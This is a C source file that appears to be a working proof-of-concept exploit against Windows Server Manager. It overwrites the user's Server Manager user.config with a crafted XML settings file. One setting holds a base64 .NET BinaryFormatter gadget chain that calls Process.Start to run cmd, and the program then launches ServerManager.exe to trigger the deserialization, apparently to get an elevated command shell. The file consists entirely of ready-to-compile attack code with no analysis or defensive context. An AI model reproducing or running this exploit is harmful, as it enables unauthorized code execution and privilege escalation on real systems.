#include <Windows.h>
#include <shellapi.h>
#include <fileapi.h>
#include <handleapi.h>
#include <stdio.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")

#define USER_CONFIG                                                            \
  "<?xml version=\"1.0\" encoding=\"utf-8\" ?> "                               \
  "<configuration>"                                                            \
  "    <configSections>"                                                       \
  "        <sectionGroup name=\"userSettings\" "                               \
  "type=\"System.Configuration.UserSettingsGroup, System, Version=4.0.0.0, "   \
  "Culture=neutral, PublicKeyToken=b77a5c561934e089\">"                        \
  "            <section "                                                      \
  "name=\"Microsoft.Windows.ServerManager.Common.Properties.Settings\" "       \
  "type=\"System.Configuration.ClientSettingsSection, System, "                \
  "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" "       \
  "allowExeDefinition=\"MachineToLocalUser\" requirePermission=\"false\"/>"    \
  "            <section "                                                      \
  "name=\"Microsoft.Windows.ServerManager.Properties.UISettings\" "            \
  "type=\"System.Configuration.ClientSettingsSection, System, "                \
  "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" "       \
  "allowExeDefinition=\"MachineToLocalUser\" requirePermission=\"false\"/>"    \
  "            <section "                                                      \
  "name=\"Microsoft.FileServer.Management.Plugin.Properties.Settings\" "       \
  "type=\"System.Configuration.ClientSettingsSection, System, "                \
  "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" "       \
  "allowExeDefinition=\"MachineToLocalUser\" requirePermission=\"false\"/> "   \
  "        </sectionGroup>"                                                    \
  "    </configSections>"                                                      \
  "    <userSettings>"                                                         \
  "        <Microsoft.Windows.ServerManager.Common.Properties.Settings>"       \
  "            <setting name=\"UpgradeRequired\" serializeAs=\"String\">"      \
  "                <value>False</value>"                                       \
  "            </setting>"                                                     \
  "            <setting name=\"WelcomeTileVisibility\" "                       \
  "serializeAs=\"String\">"                                                    \
  "                <value>Visible</value>"                                     \
  "            </setting>"                                                     \
  "            <setting name=\"PerfCounterDashboardSettings\" "                \
  "serializeAs=\"Binary\">"                                                    \
  "                "                                                           \
  "<value>AAEAAAD/////"                                                        \
  "AQAAAAAAAAAMAgAAAGpNaWNyb3NvZnQuV2luZG93cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbiwgVm" \
  "Vyc2lvbj0xMC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1" \
  "NmFkMzY0ZTM1BQEAAABITWljcm9zb2Z0LldpbmRvd3MuU2VydmVyTWFuYWdlci5Db21tb24uRG" \
  "F0YS5QZXJmQ291bnRlckRhc2hib2FyZFNldHRpbmdzAgAAADZEYXNoYm9hcmRTZXR0aW5nc2Ax" \
  "KzxSb2xlQmFzZWRTZXR0aW5ncz5rX19CYWNraW5nRmllbGQ9RGFzaGJvYXJkU2V0dGluZ3NgMS" \
  "s8U2VydmVyR3JvdXBCYXNlZFNldHRpbmdzPmtfX0JhY2tpbmdGaWVsZAMDxAJTeXN0ZW0uQ29s" \
  "bGVjdGlvbnMuR2VuZXJpYy5EaWN0aW9uYXJ5YDJbW1N5c3RlbS5JbnQzMiwgbXNjb3JsaWIsIF" \
  "ZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1" \
  "NjE5MzRlMDg5XSxbTWljcm9zb2Z0LldpbmRvd3MuU2VydmVyTWFuYWdlci5Db21tb24uRGF0YS" \
  "5QZXJmQ291bnRlckRhc2hib2FyZFNldHRpbmdDb2xsZWN0aW9uLCBNaWNyb3NvZnQuV2luZG93" \
  "cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbiwgVmVyc2lvbj0xMC4wLjAuMCwgQ3VsdHVyZT1uZXV0cm" \
  "FsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1XV3EAlN5c3RlbS5Db2xsZWN0aW9u" \
  "cy5HZW5lcmljLkRpY3Rpb25hcnlgMltbU3lzdGVtLkludDMyLCBtc2NvcmxpYiwgVmVyc2lvbj" \
  "00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUw" \
  "ODldLFtNaWNyb3NvZnQuV2luZG93cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbi5EYXRhLlBlcmZDb3" \
  "VudGVyRGFzaGJvYXJkU2V0dGluZ0NvbGxlY3Rpb24sIE1pY3Jvc29mdC5XaW5kb3dzLlNlcnZl" \
  "ck1hbmFnZXIuQ29tbW9uLCBWZXJzaW9uPTEwLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1Ym" \
  "xpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzVdXQIAAAAJAwAAAAkEAAAABAMAAADEAlN5c3Rl" \
  "bS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlgMltbU3lzdGVtLkludDMyLCBtc2Nvcm" \
  "xpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3" \
  "N2E1YzU2MTkzNGUwODldLFtNaWNyb3NvZnQuV2luZG93cy5TZXJ2ZXJNYW5hZ2VyLkNvbW1vbi" \
  "5EYXRhLlBlcmZDb3VudGVyRGFzaGJvYXJkU2V0dGluZ0NvbGxlY3Rpb24sIE1pY3Jvc29mdC5X" \
  "aW5kb3dzLlNlcnZlck1hbmFnZXIuQ29tbW9uLCBWZXJzaW9uPTEwLjAuMC4wLCBDdWx0dXJlPW" \
  "5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzVdXQMAAAAHVmVyc2lvbghD" \
  "b21wYXJlcghIYXNoU2l6ZQADAAiRAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkdlbmVyaW" \
  "NFcXVhbGl0eUNvbXBhcmVyYDFbW1N5c3RlbS5JbnQzMiwgbXNjb3JsaWIsIFZlcnNpb249NC4w" \
  "LjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV" \
  "0IAAAAAAkFAAAAAAAAAAEEAAAAAwAAAAAAAAAJBQAAAAAAAAAEBQAAAJEBU3lzdGVtLkNvbGxl" \
  "Y3Rpb25zLkdlbmVyaWMuR2VuZXJpY0VxdWFsaXR5Q29tcGFyZXJgMVtbU3lzdGVtLkludDMyLC" \
  "Btc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv" \
  "a2VuPWI3N2E1YzU2MTkzNGUwODldXQAAAAAL</value>"                               \
  "            </setting>"                                                     \
  "            <setting name=\"EventsDashboardSetting\" "                      \
  "serializeAs=\"Binary\">"                                                    \
  "                "                                                           \
  "<value>AAEAAAD/////"                                                        \
  "AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLC" \
  "BQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9u" \
  "cy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj" \
  "00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUw" \
  "ODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbG" \
  "VjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNj" \
  "b3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj" \
  "1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0u" \
  "Q29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZy" \
  "wgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlU" \
  "b2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdG" \
  "VTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAYvYyBjbWQGBwAAAANjbWQE" \
  "BQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZX" \
  "Rob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxl" \
  "Z2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZG" \
  "VyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJ" \
  "CQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2" \
  "F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFy" \
  "Z2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZW" \
  "dhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNg" \
  "M1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZX" \
  "V0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywg" \
  "bXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2" \
  "tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3Rl" \
  "bSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2" \
  "E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9" \
  "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIF" \
  "ZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1" \
  "NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAA" \
  "AABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIH" \
  "AAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW" \
  "1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAA" \
  "AAkOAAAABhQAAAA+"                                                           \
  "U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLl" \
  "N0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3Ry" \
  "aW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAA" \
  "ANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVt" \
  "LlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW" \
  "0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVt" \
  "LlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdW" \
  "JsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw==" \
  "</value>"                                                                   \
  "            </setting>"                                                     \
  "        </Microsoft.Windows.ServerManager.Common.Properties.Settings>"      \
  "        <Microsoft.Windows.ServerManager.Properties.UISettings>"            \
  "            <setting name=\"WindowHeight\" serializeAs=\"String\">"         \
  "                <value>1086</value>"                                        \
  "            </setting>"                                                     \
  "            <setting name=\"ZoomView\" serializeAs=\"String\">"             \
  "                <value>1</value>"                                           \
  "            </setting>"                                                     \
  "            <setting name=\"UpgradeRequired\" serializeAs=\"String\">"      \
  "                <value>False</value>"                                       \
  "            </setting>"                                                     \
  "            <setting name=\"WindowState\" serializeAs=\"String\">"          \
  "                <value>Maximized</value>"                                   \
  "            </setting>"                                                     \
  "            <setting name=\"WindowWidth\" serializeAs=\"String\">"          \
  "                <value>1806</value>"                                        \
  "            </setting>"                                                     \
  "            <setting name=\"F5619FC0-A012-4528-B1E3-B5579262A072\" "        \
  "serializeAs=\"Binary\">"                                                    \
  "                "                                                           \
  "<value>AAEAAAD/////"                                                        \
  "AQAAAAAAAAAEAQAAAI8CU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuRGljdGlvbmFyeWAyW1" \
  "tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy" \
  "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtNaWNyb3NvZnQuTWFuYWdlbW" \
  "VudC5VSS5JUGVyc2lzdGVuY2VPYmplY3QsIE1pY3Jvc29mdC5NYW5hZ2VtZW50LlVJLCBWZXJz" \
  "aW9uPTEwLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YW" \
  "QzNjRlMzVdXQMAAAAHVmVyc2lvbghDb21wYXJlcghIYXNoU2l6ZQADAAiSAVN5c3RlbS5Db2xs" \
  "ZWN0aW9ucy5HZW5lcmljLkdlbmVyaWNFcXVhbGl0eUNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbm" \
  "csIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5" \
  "VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCAAAAAAJAgAAAAAAAAAEAgAAAJIBU3lzdGVtLkNvbG" \
  "xlY3Rpb25zLkdlbmVyaWMuR2VuZXJpY0VxdWFsaXR5Q29tcGFyZXJgMVtbU3lzdGVtLlN0cmlu" \
  "ZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZX" \
  "lUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0AAAAACw==</value>"                         \
  "            </setting>"                                                     \
  "        </Microsoft.Windows.ServerManager.Properties.UISettings>"           \
  "        <Microsoft.FileServer.Management.Plugin.Properties.Settings>"       \
  "            <setting name=\"UpgradeRequired\" serializeAs=\"String\">"      \
  "                <value>False</value>"                                       \
  "            </setting>"                                                     \
  "        </Microsoft.FileServer.Management.Plugin.Properties.Settings>"      \
  "    </userSettings>"                                                        \
  "</configuration>"

BOOL run(wchar_t *start_path) {

  wchar_t find_path[MAX_PATH];
  RtlSecureZeroMemory(find_path, MAX_PATH);
  wsprintfW(find_path, L"%ls\\ServerManager*", start_path);
  printf_s("Find server manager folder in: %ls\n", find_path);

  WIN32_FIND_DATA folder_info;
  HANDLE server_manager_folder = FindFirstFileExW(
      find_path, FindExInfoStandard, &folder_info, FindExSearchNameMatch, NULL,
      FIND_FIRST_EX_CASE_SENSITIVE);
  if (server_manager_folder == NULL) {
    printf_s("Fail FindFirstFileExW: %d\n", GetLastError());
    return FALSE;
  }

  printf_s("Server manager folder name: %ls\n", folder_info.cFileName);
  wsprintfW(find_path, L"%ls\\%ls\\10.0.0.0\\user.config", start_path,
            folder_info.cFileName);
  printf_s("Config file path: %ls\n", find_path);

  HANDLE file = CreateFileW(find_path, GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                            OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (file == NULL) {
    printf_s("Fail CreateFileW: %d\n", GetLastError());
    return FALSE;
  }
  printf_s("Create config file: %ls\n", find_path);

  DWORD count = 0;
  WriteFile(file, USER_CONFIG, sizeof(USER_CONFIG), &count, NULL);
  printf_s("Write config bytes: %d\n", count);
  CloseHandle(file);

  return TRUE;
}

void start_server_manager(LPCWSTR lpApplicationName, LPCWSTR lpCommandLine) {
  ShellExecuteW(NULL, L"open", lpApplicationName, lpCommandLine, NULL, SW_SHOW);
  DWORD err = GetLastError();
  if (err == 0) {
    printf_s("Start ServerManager.exe\n");
  } else {
    printf_s("Fail ShellExecuteW: %d\n", err);
  }
}

int main() {
  wchar_t start_path[MAX_PATH];
  RtlSecureZeroMemory(start_path, MAX_PATH);

  DWORD user_size = MAX_PATH;
  wchar_t user[MAX_PATH];
  RtlSecureZeroMemory(user, MAX_PATH);
  if (!GetUserNameW(user, &user_size)) {
    printf_s("Fail GetUserNameW: %d", GetLastError());
    return -1;
  }

  wsprintfW(start_path,
            L"C:\\Users\\%ls\\AppData\\Local\\Microsoft_Corporation", user);

  if (!run(start_path)) {
    return -1;
  }

  start_server_manager(L"C:\\Windows\\System32\\ServerManager.exe",
                       L"C:\\Windows\\System32\\ServerManager.exe");
  return 0;
}
